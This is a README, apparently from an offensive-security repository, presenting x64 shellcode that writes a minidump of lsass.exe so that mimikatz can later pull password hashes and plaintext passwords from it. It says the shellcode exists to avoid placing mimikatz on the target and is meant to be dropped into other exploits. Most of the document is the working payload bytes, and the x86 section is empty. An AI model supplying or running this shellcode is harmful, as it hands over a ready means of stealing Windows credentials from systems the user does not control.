# Shellcode for creating a minidump-file (.dmp) of lsass.exe

**Purpose:** Created to avoid putting mimikatz directly on the targed system. The shellcode can be incorporated into different projects/exploits etc. 

**Limitations:** The SeDebugPrivilege has to be enabled before using the shellcode. *(Hint: Powershell enables SeDebugPrivileged by default if the current user is allowed to use it i.e the local administrator).*  

**Script:** The script is created in Python3 with the keystone-engine module (pip install keystone-engine)

**Where:** A file named lsass.dmp is created within the directory where the shellcode is executed.

**Fun-fact:** The Win32 API used: MiniDumpWriteDump is located within dbgcore.dll and not dbghelp.dll. For more information [MiniDumpWriteDump according to msdn](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)

**Idea:** The idea came from reading this c++ script from [ired.team](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass) 

**Thanks:** Offensive-Security and their [Exploit Development course Exp-301](https://www.offensive-security.com/exp301-osed/)

## Example:
The script can be executed directly using Python. Otherwise, extract the opcodes and use them in another project. 
![Dumping lsass.exe](/img/First.PNG "Example")

After the lsass.dmp is created, Mimikatz can be used to extract the hashes and/or passwords.
![Extracting using mimikatz](/img/Second.PNG "Example")

## x64 shellcode:
payload = ("\x48\x89\xe5\x48\x31\xc0\xb8\xff\xfc\xff\xff\xff\xc0\xf7\xd8\x48\x29\xc4\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b\x76\x18\x48\x8b\x76\x30\x48\x8b\x36\x48\x8b\x36\x4c\x8b\x66\x10\xeb\x67\x41\x5e\x48\x31\xc0\x48\x31\xff\x48\x31\xdb\x41\x8b\x44\x24\x3c\xbf\x78\xff\xff\xff\xf7\xdf\x01\xf8\x41\x8b\x3c\x04\x4c\x01\xe7\x8b\x4f\x18\x8b\x5f\x20\x4d\x89\xe0\x49\x01\xd8\x67\xe3\x35\xff\xc9\x41\x8b\x34\x88\x4c\x01\xe6\x48\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xfa\x75\xde\x8b\x57\x24\x4c\x01\xe2\x66\x8b\x0c\x4a\x8b\x57\x1c\x4c\x01\xe2\x8b\x04\x8a\x4c\x01\xe0\x41\x56\xc3\x41\xbf\x7e\xd8\xe2\x73\xe8\x8e\xff\xff\xff\x48\x89\x45\x10\x41\xbf\x8e\x4e\x0e\xec\xe8\x7f\xff\xff\xff\x48\x89\x45\x18\x41\xbf\xed\xdf\x54\xe4\xe8\x70\xff\xff\xff\x48\x89\x45\x20\x41\xbf\x4a\x65\x76\x47\xe8\x61\xff\xff\xff\x48\x89\x45\x28\xb8\x5b\xe8\xff\x83\xf7\xd8\x41\x89\xc7\xe8\x4e\xff\xff\xff\x48\x89\x45\x30\x41\xbf\xc0\x97\xe2\xef\xe8\x3f\xff\xff\xff\x48\x89\x45\x38\x31\xc0\x50\xb8\x9c\x93\x93\xff\xf7\xd8\x50\x48\xb8\x64\x62\x67\x63\x6f\x72\x65\x2e\x50\x48\x8d\x0c\x24\x48\x83\xec\x40\xff\x55\x18\x48\x83\xc4\x40\x49\x89\xc4\x41\xbf\x93\xb8\xce\x79\xe8\x08\xff\xff\xff\x48\x89\x45\x40\x48\x31\xd2\x48\x89\xd1\x48\xff\xc1\x48\xff\xc1\x48\x83\xec\x40\xff\x55\x20\x48\x83\xc4\x40\x49\x89\xc5\x48\xc7\xc0\xc8\xfd\xff\xff\x48\xf7\xd8\x50\x48\x31\xc0\x89\x44\x24\x04\x89\x44\x24\x08\x89\x44\x24\x0c\x89\x44\x24\x10\x89\x44\x24\x14\x48\x89\x44\x24\x18\x89\x44\x24\x20\x89\x44\x24\x24\x49\x89\xe6\xb8\x9b\xff\xff\xff\xf7\xd8\x50\x48\xb8\x6c\x73\x61\x73\x73\x2e\x65\x78\x50\x49\x89\xe7\x48\x31\xc0\x48\xff\xc0\xfc\xeb\x27\x48\x83\xec\x40\x4c\x89\xe9\x4c\x89\xf2\xff\x55\x28\x49\x8d\x7e\x2c\x48\x83\xc4\x40\x48\x31\xc9\xb1\x09\x4c\x89\xfe\xf3\xa6\x75\x06\x4d\x8b\x66\x08\xeb\x04\x85\xc0\x75\xd5\x48\x83\xec\x40\xb9\x01\xf0\xe0\xff\xf7\xd9\x48\x31\xd2\x4d\x89\xe0\xff\x55\x38\x48\x83\xc4\x40\x49\x89\xc5\x48\x31\xc0\x50\xb8\x90\xff\xff\xff\xf7\xd8\x50\x48\xb8\x6c\x73\x61\x73\x73\x2e\x64\x6d\x50\x48\x89\xe1\x48\x83\xec\x40\x48\x31\xc0\xb0\x10\xc1\xe0\x18\x48\x89\xc2\x4d\x31\xc0\x4d\x31\xc9\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x89\x44\x24\x20\x48\x31\xc0\xb0\x80\x48\x89\x44\x24\x28\x48\x31\xc0\x48\x89\x44\x24\x30\xff\x55\x30\x49\x89\xc6\x48\x83\xc4\x40\x48\x83\xec\x40\x4c\x89\xe9\x4c\x89\xe2\x4d\x89\xf0\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\x4c\x89\x4c\x24\x30\x49\xff\xc1\x49\xff\xc1\xff\x55\x40\x48\x83\xc4\x40\x31\xc9\xff\x55\x10")

## x86 shellcode:

